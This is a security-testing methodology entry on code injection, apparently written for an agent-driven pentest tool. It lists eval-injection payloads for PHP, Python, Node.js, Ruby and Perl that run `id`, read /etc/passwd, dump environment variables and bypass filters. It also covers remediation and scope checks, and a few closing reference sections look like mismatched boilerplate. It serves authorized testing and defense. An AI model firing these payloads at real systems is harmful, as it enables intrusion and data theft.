---
id: WSTG-INPV-11
title: Testing for Code Injection
category: Input Validation
severity_range: High-Critical
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection
---

# WSTG-INPV-11: Testing for Code Injection

## Summary

Code Injection occurs when an application incorporates user-supplied input into dynamically evaluated code. Unlike command injection (which executes OS commands), code injection executes within the application's runtime environment. This vulnerability commonly arises in languages that support dynamic code evaluation: PHP (`eval()`, `preg_replace()` with `e` modifier), Python (`eval()`, `exec()`), Node.js (`eval()`, `vm.runInNewContext()`), Ruby (`eval()`, `instance_eval()`), and Perl (`eval()`). Successful code injection allows an attacker to execute arbitrary code in the application's context, potentially leading to full server compromise.

## Test Objectives

- Identify parameters whose values may be dynamically evaluated as code
- Test if server-side code can be injected and executed
- Determine the programming language and execution context
- Assess the impact and scope of code injection

## Prerequisites

- Target application uses server-side dynamic code evaluation
- Application features that may use eval-like functions: calculators, template rendering, dynamic configuration, rule engines, report generators
- Docker pentest container capturing traffic

## Test Steps

### Step 1: Identify Potential Code Injection Points

**CLI Actions:**
1. Use `curl` to identify endpoints that may dynamically evaluate input:
   - Mathematical calculators or formula processors
   - Template or report generators
   - Dynamic configuration endpoints
   - API endpoints that accept code or expressions
   - Search features with complex query expressions
2. Use `curl` with pattern `(calc|eval|exec|expression|formula|template|render|compute|run)` to find candidate endpoints
3. Use `save to manual-review file` for each candidate endpoint

### Step 2: Test for PHP Code Injection

**CLI Actions:**
Use `curl` to test PHP code injection:

**Basic detection with mathematical expression:**
```
GET /page.php?input=1+1 HTTP/1.1
Host: target.com
```
If the response contains `2`, the input may be evaluated.

**PHP function call:**
```
GET /page.php?input=phpinfo() HTTP/1.1
Host: target.com
```

**String concatenation test:**
```
GET /page.php?input='.phpinfo().' HTTP/1.1
Host: target.com
```

**System command via PHP:**
```
GET /page.php?input=system('id') HTTP/1.1
Host: target.com
```

Use `curl --data-urlencode` to encode special characters as needed.

### Step 3: Test for Python Code Injection

**CLI Actions:**
Use `curl` to test Python eval/exec injection:

**Mathematical expression:**
```
POST /api/calculate HTTP/1.1
Host: target.com
Content-Type: application/json

{"expression": "7*7"}
```

If `49` is returned, test further:

**Import and execute:**
```
POST /api/calculate HTTP/1.1
Host: target.com
Content-Type: application/json

{"expression": "__import__('os').popen('id').read()"}
```

**Using eval bypass techniques:**
```
POST /api/calculate HTTP/1.1
Host: target.com
Content-Type: application/json

{"expression": "eval('__import__(\"os\").popen(\"id\").read()')"}
```

### Step 4: Test for Node.js Code Injection

**CLI Actions:**
Use `curl` to test JavaScript/Node.js eval injection:

**Basic eval test:**
```
GET /api/eval?expr=7*7 HTTP/1.1
Host: target.com
```

**Process information:**
```
GET /api/eval?expr=process.version HTTP/1.1
Host: target.com
```

**Command execution via child_process:**
```
GET /api/eval?expr=require('child_process').execSync('id').toString() HTTP/1.1
Host: target.com
```

Use `curl --data-urlencode` to encode the payload:
```
GET /api/eval?expr=require(%27child_process%27).execSync(%27id%27).toString() HTTP/1.1
Host: target.com
```

### Step 5: Test for Ruby Code Injection

**CLI Actions:**
Use `curl` to test Ruby eval injection:

**Basic expression:**
```
GET /calculate?formula=7*7 HTTP/1.1
Host: target.com
```

**System command:**
```
GET /calculate?formula=`id` HTTP/1.1
Host: target.com
```

**Kernel.system call:**
```
GET /calculate?formula=system('id') HTTP/1.1
Host: target.com
```

### Step 6: Test for Time-Based Blind Code Injection

**CLI Actions:**
If there is no visible output, use `curl` with time-based payloads:

**PHP:**
```
GET /page.php?input=sleep(5) HTTP/1.1
Host: target.com
```

**Python:**
```
POST /api/calculate HTTP/1.1
Host: target.com
Content-Type: application/json

{"expression": "__import__('time').sleep(5)"}
```

**Node.js:**
```
GET /api/eval?expr=require('child_process').execSync('sleep+5') HTTP/1.1
Host: target.com
```

**Ruby:**
```
GET /calculate?formula=sleep(5) HTTP/1.1
Host: target.com
```

If the response is delayed by approximately 5 seconds, blind code injection is confirmed.

### Step 7: Verify Impact

**CLI Actions:**
Once code injection is confirmed, use `curl` to demonstrate impact:
1. Read a known file to prove file system access
2. Execute `id` or `whoami` to show execution context
3. Use `save to manual-review file` to save the proof-of-concept request
4. Do NOT perform destructive actions

Use `rynix_plugin_run('template-scan')` to check if template-scan has identified any code injection findings.

## Payloads

### PHP Code Injection Payloads
```
phpinfo()
system('id')
exec('id')
passthru('id')
shell_exec('id')
'.phpinfo().'
';phpinfo();//
".phpinfo()."
";system('id');//
${phpinfo()}
${system('id')}
```

### Python Code Injection Payloads
```
7*7
__import__('os').popen('id').read()
__import__('os').system('id')
eval('__import__("os").popen("id").read()')
exec('import os;os.system("id")')
__import__('subprocess').check_output(['id'])
open('/etc/passwd').read()
```

### Node.js Code Injection Payloads
```
7*7
process.version
process.env
require('child_process').execSync('id').toString()
require('fs').readFileSync('/etc/passwd','utf8')
this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()
global.process.mainModule.require('child_process').execSync('id').toString()
```

### Ruby Code Injection Payloads
```
7*7
`id`
system('id')
exec('id')
%x(id)
IO.popen('id').read
File.read('/etc/passwd')
Kernel.exec('id')
```

### Perl Code Injection Payloads
```
system('id')
exec('id')
`id`
qx(id)
open(FH,"/etc/passwd");while(<FH>){print}
```

### Time-Based Blind Payloads
```
sleep(5)
__import__('time').sleep(5)
require('child_process').execSync('sleep 5')
java.lang.Thread.sleep(5000)
Time.sleep(5)
```

### Filter Bypass Payloads
```
SyStEm('id')
\x73\x79\x73\x74\x65\x6d('id')
chr(115).chr(121).chr(115).chr(116).chr(101).chr(109)
${'system'}('id')
call_user_func('system','id')
```

## Detection Criteria

A finding should be logged when:
- Mathematical or code expressions are evaluated and results returned
- PHP, Python, Ruby, or Node.js functions execute in the response
- System commands execute through code injection
- Time-based payloads produce measurable response delays
- Error messages reveal the language runtime or eval function in use

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Remote code execution with full system access | Critical |
| Code execution in sandboxed/limited environment | High |
| Blind code injection confirmed (time-based) | High |
| Code evaluation limited to mathematical expressions only | Medium |
| Error messages reveal code evaluation context but no execution | Medium |
| Input appears to be evaluated but restricted to safe operations | Low |

## Remediation

- Avoid using dynamic code evaluation functions (`eval()`, `exec()`, `preg_replace()` with `e`)
- Use safe alternatives: mathematical expression parsers, sandboxed interpreters, DSLs
- If dynamic evaluation is required, implement strict allowlisting of permitted functions and syntax
- Use static analysis tools to identify `eval()` and similar function usage
- Implement code review processes that flag dynamic evaluation patterns
- Apply least-privilege execution contexts for application processes
- Use language-level sandboxing where available (e.g., Python RestrictedPython, Node.js vm2)
- Validate input against strict patterns (e.g., numeric-only for calculators)

## References

- [OWASP Testing Guide - Code Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection)
- [CWE-94: Improper Control of Generation of Code (Code Injection)](https://cwe.mitre.org/data/definitions/94.html)
- [CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code (Eval Injection)](https://cwe.mitre.org/data/definitions/95.html)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V5 Validation — input handling and parser differentials.
- V12 Files and Resources — upload and inclusion controls.

## CWE references

- CWE-20: Improper Input Validation
- CWE-89: SQL Injection
- CWE-79: Cross-site Scripting

## Rynix tooling

- Primary tools: ``http_probe``, ``rynix_plugin_run` (template-scan)`, ``record_finding``

## Test focus

- Fuzz parameters with encoding variants (URL, Unicode, double-encoding).
- Switch Content-Type to traverse alternate validators.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

